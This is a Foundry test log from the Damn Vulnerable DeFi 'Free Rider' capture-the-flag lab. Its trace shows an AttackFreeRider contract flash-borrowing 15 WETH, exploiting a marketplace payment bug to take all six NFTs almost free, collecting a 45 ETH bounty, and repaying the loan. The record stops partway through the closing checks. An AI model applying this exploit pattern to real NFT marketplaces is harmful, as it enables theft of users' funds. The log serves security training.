forge test --match-path FreeRider.t.sol -vvvv 
[⠊] Compiling...
[⠒] Compiling 5 files with Solc 0.8.25
[⠑] Solc 0.8.25 finished in 1.48s
Compiler run successful!

Ran 2 tests for test/free-rider/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_assertInitialState() (gas: 82130)
Traces:
  [82130] FreeRiderChallenge::test_assertInitialState()
    ├─ [0] VM::assertEq(100000000000000000 [1e17], 100000000000000000 [1e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [2381] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::token0() [staticcall]
    │   └─ ← [Return] WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]
    ├─ [0] VM::assertEq(WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return]
    ├─ [2357] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::token1() [staticcall]
    │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    ├─ [0] VM::assertEq(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]
    │   └─ ← [Return]
    ├─ [2480] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::balanceOf(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return] 11618950038622250654537 [1.161e22]
    ├─ [0] VM::assertGt(11618950038622250654537 [1.161e22], 0) [staticcall]
    │   └─ ← [Return]
    ├─ [2382] DamnValuableNFT::owner() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return]
    ├─ [2609] DamnValuableNFT::rolesOf(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [305] DamnValuableNFT::MINTER_ROLE() [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2617] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [2283] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 6
    ├─ [0] VM::assertEq(6, 6) [staticcall]
    │   └─ ← [Return]
    ├─ [2780] DamnValuableNFT::isApprovedForAll(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(45000000000000000000 [4.5e19], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_freeRider() (gas: 1141259)
Traces:
  [1252859] FreeRiderChallenge::test_freeRider()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [662664] → new AttackFreeRider@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 1966 bytes of code
    ├─ [465932] AttackFreeRider::start()
    │   ├─ [462655] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(15000000000000000000 [1.5e19], 0, AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0x31)
    │   │   ├─ [29658] WETH::transfer(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19])
    │   │   │   ├─ emit Transfer(from: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [401492] AttackFreeRider::uniswapV2Call(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19], 0, 0x31)
    │   │   │   ├─ [15949] WETH::withdraw(15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0x0000000000000000000000000000000000000000, amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Withdrawal(to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [208658] FreeRiderNFTMarketplace::buyMany{value: 15000000000000000000}([0, 1, 2, 3, 4, 5])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [40219] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 0, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [11519] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 1, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [11519] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 2, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [11519] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 3, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [11519] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 4, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [2617] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [11519] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5)
    │   │   │   │   │   ├─ [857] AttackFreeRider::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 5, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] AttackFreeRider::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5, price: 15000000000000000000 [1.5e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [59632] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 0)
    │   │   │   │   ├─ [29393] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [11332] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 1)
    │   │   │   │   ├─ [5493] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [11332] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 2)
    │   │   │   │   ├─ [5493] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [11332] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 3)
    │   │   │   │   ├─ [5493] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [11332] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 4)
    │   │   │   │   ├─ [5493] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [18541] DamnValuableNFT::safeTransferFrom(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 5)
    │   │   │   │   ├─ [12702] FreeRiderRecoveryManager::onERC721Received(AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [617] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   ├─ [0] player::fallback{value: 45000000000000000000}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [23968] WETH::deposit{value: 15060000000000000000}()
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15060000000000000000 [1.506e19])
    │   │   │   │   ├─ emit Deposit(who: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15060000000000000000 [1.506e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [2958] WETH::transfer(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15060000000000000000 [1.506e19])
    │   │   │   │   ├─ emit Transfer(from: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 15060000000000000000 [1.506e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [539] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 9000060000000000000000 [9e21]
    │   │   ├─ [2516] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
    │   │   ├─ emit Sync(reserve0: 9000060000000000000000 [9e21], reserve1: 15000000000000000000000 [1.5e22])
    │   │   ├─ emit Swap(sender: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount0In: 15060000000000000000 [1.506e19], amount1In: 0, amount0Out: 15000000000000000000 [1.5e19], amount1Out: 0, to: AttackFreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [28638] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 0)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4738] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 1)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 1)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4738] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 2)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 2)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4738] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 3)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 3)
    │   └─ ← [Stop]
    ├─ [617] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
